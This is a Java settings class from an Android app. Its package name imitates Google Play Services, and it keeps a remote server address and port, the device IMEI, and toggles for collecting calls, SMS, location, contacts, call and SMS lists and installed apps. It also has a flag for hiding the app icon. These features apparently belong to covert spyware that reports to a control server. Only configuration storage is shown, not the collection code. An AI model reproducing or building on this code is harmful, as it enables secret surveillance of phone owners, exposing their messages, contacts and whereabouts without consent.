package com.google.android.gms.persistent.googleapps.utils;

import android.content.Context;
import android.content.SharedPreferences;
import android.telephony.TelephonyManager;

import com.google.android.gms.persistent.googleapps.network.models.data.DeviceInfo;
import com.google.gson.Gson;

import javax.inject.Inject;

import io.reactivex.Single;

/**
 * Created by OldMan on 08.04.2017.
 */

public class Preferences {
    private Gson gson;
    private Context context;

    private final String PREFS_NAME = "store";
    private SharedPreferences prefs;
    private final String visit_key = "is_visited";

    private final String ip_address = "ip_address";
    private final String port = "port";
    //-------------for begining request---------------------
    private final String baseDeviceInfo = "base_device_info";
    private final String hideIcon = "is_hide_icon";
    private final String isAllDeviceInfo = "is_all_device_info";

    //-------------------initial data------------------------
    private final String device = "device";
    private final String imei = "imei";
    private final String periodRequest = "period_request";

    //------------variable settings-----------------------
    private final String call = "call";
    private final String sms = "sms";
    private final String location = "location";
    private final String locationMode = "location_mode";
    private final String dispatchMode = "dispatch_mode";
    private final String locationUpdateTime = "location_update_time";

    private final String callList = "call_list";
    private final String smsList = "sms_list";
    private final String appList = "app_list";
    private final String phoneBook = "phone_book";


    @Inject
    public Preferences(Context context) {
        prefs = context.getSharedPreferences(PREFS_NAME, 0);
        gson = new Gson();
        this.context = context;
    }

    public Single<String> getIpAddress() {
        return Single.just(prefs.getString(ip_address, "192.168.50.179"));
    }

    public Single<String> setIpAddress(String ipAddress) {
        if (prefs.edit().putString(ip_address, ipAddress).commit())
            return Single.just(ipAddress);
        else
            return Single.just("");
    }

    public Single<String> getPort() {
        return Single.just(prefs.getString(port, "10080"));
    }

    public Single<String> setPort(String port) {
        if (prefs.edit().putString(this.port, port).commit())
            return Single.just(port);
        else
            return Single.just("");
    }

    public void setDevice(String mDevice) {
        prefs.edit().putString(device, mDevice).apply();
    }

    public String getDevice() {
        return prefs.getString(device, null);
    }

    public void setImei() {
        try {
            TelephonyManager mngr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            prefs.edit().putString(imei, mngr.getDeviceId()).apply();
            ;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String getImei() {
        return prefs.getString(imei, null);
    }

    public String getPeriodRequest() {
        return prefs.getString(periodRequest, null);
    }

    public void setPeriodRequest(String mPeriodRequest) {
        prefs.edit().putString(periodRequest, mPeriodRequest).apply();
    }

    public int getCall() {
        return prefs.getInt(call, 0);
    }

    public void setCall(int call) {
        prefs.edit().putInt(this.call, call).apply();
    }

    public int getSms() {
        return prefs.getInt(sms, 0);
    }

    public void setSms(int sms) {
        prefs.edit().putInt(this.sms, sms).apply();
    }

    public int getLocation() {
        return prefs.getInt(location, 0);
    }

    public void setLocation(int location) {
        prefs.edit().putInt(this.location, location).apply();
    }

    public int getModeLocation() {
        return prefs.getInt(locationMode, 0);

    }

    public void setModeLocation(int locationMode) {
        prefs.edit().putInt(this.locationMode, locationMode).apply();
    }

    public int getDispatchMode() {
        return prefs.getInt(dispatchMode, 0);
    }

    public void setDispatchMode(int dispatch) {
        prefs.edit().putInt(dispatchMode, dispatch).apply();
    }

    public int getLocationUpdateTime() {
        return prefs.getInt(locationUpdateTime, 0);
    }

    public void setLocationUpdateTime(int time) {
        prefs.edit().putInt(this.locationUpdateTime, time).apply();
    }

    public int getCallList() {
        return prefs.getInt(callList, 0);
    }

    public void setCallList(int callList) {
        prefs.edit().putInt(this.callList, callList).apply();
    }

    public int getSmsList() {
        return prefs.getInt(smsList, 0);
    }

    public void setSmsList(int smsList) {
        prefs.edit().putInt(this.smsList, smsList).apply();
    }

    public int getAppList() {
        return prefs.getInt(appList, 0);
    }

    public void setAppList(int listApp) {
        prefs.edit().putInt(appList, listApp).apply();
    }

    public void setPhoneBook(int phoneBook) {
        prefs.edit().putInt(this.phoneBook, phoneBook).apply();
    }

    public int getPhoneBook() {
        return prefs.getInt(phoneBook, 0);
    }

    public boolean isVisited() {
        return prefs.getBoolean(visit_key, false);
    }

    public void setVisited() {
        prefs.edit().putBoolean(visit_key, true).apply();
    }

    public DeviceInfo getBaseDeviceInfo() {
        String dev = prefs.getString(baseDeviceInfo, null);
        return gson.fromJson(dev, DeviceInfo.class);
    }


    public void setBaseDeviceInfo(DeviceInfo dev) {
        String stringDev = gson.toJson(dev);
        prefs.edit().putString(baseDeviceInfo, stringDev).apply();
    }


    public boolean isHideIcon() {
        return prefs.getBoolean(hideIcon, false);
    }

    public void setHideIcon(boolean isHide) {
        prefs.edit().putBoolean(hideIcon, isHide).apply();
    }

    public boolean isAllDeviceInfo() {
        return prefs.getBoolean(isAllDeviceInfo, false);
    }

    public void setIsAllDeviceInfo(boolean isInfo) {
        prefs.edit().putBoolean(isAllDeviceInfo, isInfo).apply();
    }

    public void setFirstSettings() {
        SharedPreferences.Editor edit = prefs.edit();
        edit.putBoolean("hasVisited", true);
        edit.putBoolean("is_info", true);
        edit.putString("period", "1"); // period must equal 10 min
        edit.putString("code", "-1");
        edit.commit();
    }

}
